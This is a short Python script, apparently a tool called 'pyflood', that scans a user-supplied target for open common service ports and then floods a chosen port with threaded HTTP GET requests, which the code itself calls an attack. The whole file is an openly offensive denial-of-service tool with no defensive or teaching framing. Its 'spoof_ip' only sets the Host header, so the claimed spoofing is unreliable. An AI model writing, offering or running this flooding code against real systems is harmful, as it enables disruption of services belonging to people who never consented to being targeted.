import os
import socket
import threading

request_count = 0

def scan(target):
  common_ports = {
    21: "FTP",
    22: "SSH",
    23: "Telnet",
    25: "SMTP",
    53: "DNS",
    80: "HTTP",
    110: "POP3",
    143: "IMAP",
    443: "HTTPS",
    587: "SMTP",
    3306: "MySQL",
    3389: "RDP",
    5900: "VNC"  }
  for port, service in common_ports.items():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.settimeout(1)
        try:
            result = s.connect_ex((target, port))
            if result == 0:
                print(f"Port {port} / {service} is OPEN on {target}.")
        except socket.error as e:
            print(f"Failed to scan {target}:{port} due to {e}")

def scan_request(target, port, spoof_ip):
  global request_count
  with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.settimeout(1)
    try:
        s.connect((target, int(port)))
        request = f"GET / HTTP/1.1\r\nHost: {spoof_ip}\r\n\r\n"
        s.send(request.encode('ascii'))
        request_count += 1
        print(f"Request sent to {target}:{port} from {spoof_ip},Total Count: {request_count}")
    except socket.error as e:
        print(f"Error sending data to {target}:{port}: {e}")
      
def attack(target, port, spoof_ip, threads):
  for _ in range(threads):
    thread = threading.Thread(target=scan_request, args=(target, port, spoof_ip))
    thread.start()
    
def main():
  target = str(input('Enter target IP: '))
  scan(target)
  port = input('Select a port number: ')
  threads = int(input('Enter number of threads: '))
  spoof_ip = '192.168.101.100'
  attack(target, port, spoof_ip, threads)


os.system("clear")
os.system("toilet pyflood")

if __name__ == '__main__':
  main()